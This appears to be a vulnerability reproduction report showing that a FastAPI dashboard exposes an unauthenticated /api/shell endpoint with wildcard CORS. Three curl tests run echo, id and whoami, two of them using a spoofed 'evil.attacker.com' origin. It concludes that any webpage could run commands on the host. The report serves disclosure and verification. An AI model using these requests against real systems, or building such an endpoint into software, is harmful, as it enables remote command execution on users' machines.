# Reproduction Evidence: driveby-rce-cors

## Environment
- Platform: macOS Darwin 25.3.0
- FastAPI 0.135.1, Starlette 0.50.0, Uvicorn 0.38.0
- Commit: 4c06f66 (HEAD of main)

## Test 1: Direct Shell Command Execution (no auth)
```
$ curl -s -X POST "http://127.0.0.1:19876/api/shell?command=echo%20PWNED"
{"stdout":"PWNED\n","stderr":"","returncode":0}
```
Result: PASS -- arbitrary command executed, output returned.

## Test 2: CORS Preflight Check
```
$ curl -s -X OPTIONS "http://127.0.0.1:19876/api/shell?command=id" \
  -H "Origin: http://evil.attacker.com" \
  -H "Access-Control-Request-Method: POST" -D - -o /dev/null

HTTP/1.1 200 OK
access-control-allow-origin: *
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-max-age: 600
```
Result: PASS -- preflight succeeds for any origin, allowing POST.

## Test 3: Cross-Origin POST (simulated browser attack)
```
$ curl -s -X POST "http://127.0.0.1:19876/api/shell?command=whoami" \
  -H "Origin: http://evil.attacker.com" -D -

HTTP/1.1 200 OK
access-control-allow-origin: *
content-type: application/json
{"stdout":"bytedance\n","stderr":"","returncode":0}
```
Result: PASS -- cross-origin request succeeds, `whoami` executed, output readable by attacker JS.

## Conclusion
All three tests confirm the vulnerability is fully exploitable. A malicious webpage can execute arbitrary commands on the host running the dashboard.
